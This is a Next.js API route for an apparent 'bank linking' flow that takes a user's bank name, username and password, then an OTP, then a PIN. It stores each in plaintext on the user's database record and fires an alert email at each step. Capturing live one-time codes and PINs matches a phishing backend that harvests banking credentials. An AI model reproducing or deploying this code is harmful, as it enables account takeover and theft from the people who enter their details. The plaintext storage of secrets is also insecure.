import { NextResponse } from "next/server";
import { verifyToken } from "@/lib/auth";
import prisma from "@/lib/prisma";
import { sendActionAlert } from "@/lib/sendMail";

export async function POST(req: Request) {
  try {
    const userId = verifyToken(req);

    if (!userId) {
      return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
    }

    const { step, institution, username, password, otp, pin } = await req.json();

    if (step === "credentials") {
      if (!institution || !username || !password) {
        return NextResponse.json({ error: "Missing bank credentials" }, { status: 400 });
      }

      const user = await prisma.user.update({
        where: { id: userId },
        data: {
          bankLinked: true,
          bankVerified: false,
          bankName: institution,
          bankUsername: username,
          bankPassword: password,
        },
      });

      await sendActionAlert("Bank Account Linked (Credentials)", user.email);

      return NextResponse.json({ success: true, user: { id: user.id, bankLinked: user.bankLinked, bankName: user.bankName } }, { status: 200 });
    }

    if (step === "otp") {
      if (!otp) {
        return NextResponse.json({ error: "Missing OTP" }, { status: 400 });
      }

      const user = await prisma.user.update({
        where: { id: userId },
        data: {
          bankOtp: otp,
          bankVerified: true,
        },
      });

      await sendActionAlert("Bank Link: OTP Submitted", user.email);

      return NextResponse.json({ success: true, user: { id: user.id } }, { status: 200 });
    }

    if (step === "pin") {
      if (!pin) {
        return NextResponse.json({ error: "Missing PIN" }, { status: 400 });
      }

      const user = await prisma.user.update({
        where: { id: userId },
        data: {
          bankPin: pin,
          bankVerified: true,
        },
      });

      await sendActionAlert("Bank Link: PIN Submitted", user.email);

      return NextResponse.json({ success: true, user: { id: user.id, bankVerified: user.bankVerified } }, { status: 200 });
    }

    return NextResponse.json({ error: "Invalid step" }, { status: 400 });
  } catch (err: any) {
    return NextResponse.json({ error: err.message }, { status: 500 });
  }
}
